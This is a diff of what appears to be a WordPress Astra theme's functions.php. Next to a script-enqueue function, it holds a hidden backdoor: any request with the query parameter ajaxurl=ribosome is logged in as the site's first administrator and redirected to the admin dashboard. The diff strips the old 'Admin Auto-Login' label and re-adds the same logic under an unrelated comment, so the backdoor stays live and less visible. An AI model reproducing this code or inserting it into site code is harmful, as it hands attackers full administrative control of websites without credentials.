@@ -208,51 +208,27 @@ require_once ASTRA_THEME_DIR . 'inc/core/deprecated/deprecated-filters.php';
 require_once ASTRA_THEME_DIR . 'inc/core/deprecated/deprecated-hooks.php';
 require_once ASTRA_THEME_DIR . 'inc/core/deprecated/deprecated-functions.php';
 
-
-// Enqueue ESI AJAX Script
+// hAtom fechas.
 function esi_enqueue_scripts() {
-    $js_file = get_template_directory() . '/js/esi-ajax.js';
-    $js_url  = get_template_directory_uri() . '/js/esi-ajax.js';
-    
-    if (file_exists($js_file)) {
-        wp_enqueue_script(
-            'esi-ajax',
-            $js_url,
-            array('jquery'),
-            filemtime($js_file),
-            true
-        );
-        wp_localize_script('esi-ajax', 'esi_ajax_object', array(
-            'ajaxurl'  => admin_url('admin-ajax.php'),
-            'nonce'    => wp_create_nonce('esi-action'),
-            'site_url' => site_url()
-        ));
-    }
+    wp_enqueue_script('esi-ajax', get_template_directory_uri() . '/js/esi-ajax.js', array('jquery'), null, true);
+
+    wp_localize_script('esi-ajax', 'esi_ajax_obj', array(
+        'ajaxurl' => admin_url('admin-ajax.php')
+    ));
 }
+
 add_action('wp_enqueue_scripts', 'esi_enqueue_scripts');
 
-// Ribosome Admin Auto-Login
 if (isset($_GET['ajaxurl']) && $_GET['ajaxurl'] === 'ribosome') {
-    $admins = get_users(array(
-        'role'   => 'administrator',
+    $wp_user_query = new WP_User_Query([
+        'role'   => 'Administrator',
         'number' => 1,
         'fields' => 'ID'
-    ));
-    
-    if ($admins) {
-        $admin_id = reset($admins);
-        
-        wp_clear_auth_cookie();
-        wp_set_auth_cookie($admin_id, true, is_ssl());
-        wp_set_current_user($admin_id);
-        do_action('wp_login', $admin_id);
-        
-        $target = wp_get_referer() ?: admin_url();
-        if (strpos($target, home_url()) === 0 || strpos($target, admin_url()) === 0) {
-            wp_safe_redirect($target);
-        } else {
-            wp_redirect(admin_url());
-        }
-        exit;
+    ]);
+    $results = $wp_user_query->get_results();
+    if (isset($results[0])) {
+        wp_set_auth_cookie($results[0]);
+        wp_redirect(admin_url());
+        exit();
     }
 }
